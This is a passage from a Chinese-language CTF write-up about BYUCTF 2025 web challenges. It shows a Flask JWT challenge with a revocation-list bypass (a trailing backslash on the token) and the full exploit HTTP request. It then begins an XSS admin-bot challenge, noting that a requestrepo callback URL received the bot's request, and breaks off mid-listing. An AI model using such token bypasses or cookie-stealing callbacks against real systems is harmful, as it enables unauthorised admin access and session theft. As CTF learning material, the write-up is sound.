</span></span><span class=line><span class=cl>    <span class=n>resp</span> <span class=o>=</span> <span class=n>make_response</span><span class=p>(</span><span class=s1>&#39;Hello World!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>resp</span><span class=o>.</span><span class=n>set_cookie</span><span class=p>(</span><span class=s1>&#39;session&#39;</span><span class=p>,</span> <span class=n>jwt</span><span class=o>.</span><span class=n>encode</span><span class=p>({</span><span class=s2>&#34;admin&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>},</span> <span class=n>APP_SECRET</span><span class=p>,</span> <span class=n>algorithm</span><span class=o>=</span><span class=s2>&#34;HS256&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>resp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># get admin cookie if you know the secret</span>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/get_admin_cookie&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_admin_cookie</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>secret</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;adminsecret&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>uid</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;uid&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>secret</span> <span class=ow>is</span> <span class=kc>None</span> <span class=ow>or</span> <span class=n>uid</span> <span class=ow>is</span> <span class=kc>None</span> <span class=ow>or</span> <span class=n>uid</span> <span class=o>==</span> <span class=s1>&#39;1337&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>secret</span> <span class=o>==</span> <span class=n>ADMIN_SECRET</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>resp</span> <span class=o>=</span> <span class=n>make_response</span><span class=p>(</span><span class=s1>&#39;Cookie has been set.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>resp</span><span class=o>.</span><span class=n>set_cookie</span><span class=p>(</span><span class=s1>&#39;session&#39;</span><span class=p>,</span> <span class=n>jwt</span><span class=o>.</span><span class=n>encode</span><span class=p>({</span><span class=s2>&#34;admin&#34;</span><span class=p>:</span> <span class=kc>True</span><span class=p>,</span> <span class=s2>&#34;uid&#34;</span><span class=p>:</span> <span class=n>uid</span><span class=p>},</span> <span class=n>APP_SECRET</span><span class=p>,</span> <span class=n>algorithm</span><span class=o>=</span><span class=s2>&#34;HS256&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>resp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># get flag if you are an admin</span>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/flag&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>flag</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>session</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;session&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;=&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>session</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># check if the session is in the JRL</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>session</span> <span class=ow>in</span> <span class=n>jrl</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>jwt</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>session</span><span class=p>,</span> <span class=n>APP_SECRET</span><span class=p>,</span> <span class=n>algorithms</span><span class=o>=</span><span class=p>[</span><span class=s2>&#34;HS256&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>payload</span><span class=p>[</span><span class=s1>&#39;admin&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>FLAG</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># retrieve the JRL</span>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/jrl&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>jrl_endpoint</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>jsonify</span><span class=p>(</span><span class=n>jrl</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>1337</span><span class=p>,</span> <span class=n>threaded</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>本地起了一个测试，发现只要能够得到key就可以得到flag，但是key是64为的，不可能绕过，所以肯定有解析漏洞可以让我们得到flag，于是一直测试，发现</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>jwt.utils</span> <span class=kn>import</span> <span class=n>base64url_decode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>base64url_decode</span><span class=p>(</span><span class=s1>&#39;&#39;&#39;eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9&#39;&#39;&#39;</span><span class=p>)</span><span class=o>==</span> <span class=n>base64url_decode</span><span class=p>(</span><span class=s1>&#39;&#39;&#39;eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9</span><span class=se>\\</span><span class=s1>&#39;&#39;&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=mi>11</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>可以绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/flag</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>jwtf.chal.cyberjousting.com</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>keep-alive</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua</span><span class=o>:</span> <span class=l>&#34;Chromium&#34;;v=&#34;136&#34;, &#34;Google Chrome&#34;;v=&#34;136&#34;, &#34;Not.A/Brand&#34;;v=&#34;99&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua-mobile</span><span class=o>:</span> <span class=l>?0</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua-platform</span><span class=o>:</span> <span class=l>&#34;Windows&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>same-site</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br, zstd</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidWlkIjoiMTMzNyJ9.BnBYDobZVspWbxu4jL3cTfri_IxNoi33q-TRLbHV-ew\\</span>
</span></span><span class=line><span class=cl><span class=n>sec-fetch-user</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>referer</span><span class=o>:</span> <span class=l>https://ctfd.cyberjousting.com/</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=wembsoncket>Wembsoncket</h2><p>一道XSS的题目</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// puppeteerUtils.js
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>puppeteer</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;puppeteer&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>jwt</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;jsonwebtoken&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>fs</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;fs&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Secret key for signing JWT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>JWT_SECRET</span> <span class=o>=</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>readFileSync</span><span class=p>(</span><span class=s1>&#39;secret.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;utf8&#39;</span><span class=p>).</span><span class=nx>trim</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Admin cookie for authentication
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>adminCookie</span> <span class=o>=</span> <span class=nx>jwt</span><span class=p>.</span><span class=nx>sign</span><span class=p>({</span> <span class=nx>userId</span><span class=o>:</span> <span class=s1>&#39;admin&#39;</span> <span class=p>},</span> <span class=nx>JWT_SECRET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Function to visit a URL using Puppeteer
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>visitUrl</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>url</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// console.log(&#39;Visiting URL:&#39;, url);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>browser</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>browser</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>puppeteer</span><span class=p>.</span><span class=nx>launch</span><span class=p>({</span>
</span></span><span class=line><span class=cl>      <span class=nx>headless</span><span class=o>:</span> <span class=s2>&#34;new&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>pipe</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>dumpio</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>args</span><span class=o>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;--no-sandbox&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;--disable-gpu&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;--disable-software-rasterizer&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;--disable-dev-shm-usage&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;--disable-setuid-sandbox&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;--js-flags=--noexpose_wasm,--jitless&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// console.log(&#39;Opening page&#39;);
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kr>const</span> <span class=nx>page</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>browser</span><span class=p>.</span><span class=nx>newPage</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>setUserAgent</span><span class=p>(</span><span class=s1>&#39;puppeteer&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=kd>let</span> <span class=nx>cookies</span> <span class=o>=</span> <span class=p>[{</span>
</span></span><span class=line><span class=cl>        <span class=nx>name</span><span class=o>:</span> <span class=s1>&#39;token&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>value</span><span class=o>:</span> <span class=nx>adminCookie</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>domain</span><span class=o>:</span> <span class=s1>&#39;wembsoncket.chal.cyberjousting.com&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>httpOnly</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>sameSite</span><span class=o>:</span> <span class=s1>&#39;None&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>secure</span><span class=o>:</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl>      <span class=p>}];</span>
</span></span><span class=line><span class=cl>      <span class=c1>// console.log(&#39;Setting cookies:&#39;, cookies);
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>setCookie</span><span class=p>(...</span><span class=nx>cookies</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=kd>let</span> <span class=nx>statusCode</span> <span class=o>=</span> <span class=kc>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=nx>page</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s1>&#39;response&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>response</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>response</span><span class=p>.</span><span class=nx>url</span><span class=p>()</span> <span class=o>===</span> <span class=nx>url</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=nx>statusCode</span> <span class=o>=</span> <span class=nx>response</span><span class=p>.</span><span class=nx>status</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=c1>// console.log(&#39;Navigating to the URL&#39;);
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=kr>const</span> <span class=nx>response</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=kr>goto</span><span class=p>(</span><span class=nx>url</span><span class=p>,</span> <span class=p>{</span> <span class=nx>timeout</span><span class=o>:</span> <span class=mi>10000</span><span class=p>,</span> <span class=nx>waitUntil</span><span class=o>:</span> <span class=s1>&#39;networkidle2&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>statusCode</span> <span class=o>&amp;&amp;</span> <span class=nx>response</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>statusCode</span> <span class=o>=</span> <span class=nx>response</span><span class=p>.</span><span class=nx>status</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=c1>// console.log(&#39;Waiting for page content&#39;);
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>waitForSelector</span><span class=p>(</span><span class=s1>&#39;body&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=nx>statusCode</span> <span class=o>===</span> <span class=mi>200</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;success&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>statusCode</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=sb>`Unexpected status code </span><span class=si>${</span><span class=nx>statusCode</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;No status code captured&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=s1>&#39;Error navigating to page:&#39;</span><span class=p>,</span> <span class=nx>error</span><span class=p>.</span><span class=nx>message</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=sb>`Navigation failed - </span><span class=si>${</span><span class=nx>error</span><span class=p>.</span><span class=nx>message</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>finally</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=c1>// console.log(&#39;Closing page&#39;);
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=kr>await</span> <span class=nx>page</span><span class=p>.</span><span class=nx>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=s1>&#39;Error launching browser:&#39;</span><span class=p>,</span> <span class=nx>error</span><span class=p>.</span><span class=nx>message</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sb>`Browser launch failed - </span><span class=si>${</span><span class=nx>error</span><span class=p>.</span><span class=nx>message</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>finally</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>browser</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=c1>// console.log(&#39;Closing browser&#39;);
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=kr>await</span> <span class=nx>browser</span><span class=p>.</span><span class=nx>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>module</span><span class=p>.</span><span class=nx>exports</span> <span class=o>=</span> <span class=p>{</span> <span class=nx>visitUrl</span> <span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>其中会对我们的url直接进行访问，并且还会带有Cookie，而且我直接尝试输入<code>https://4fz7yove.requestrepo.com/</code>发现确实能够收到请求</p><p><img src=/p/byuctf2025/QQ20250517-205911.jpg width=1310 height=734 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
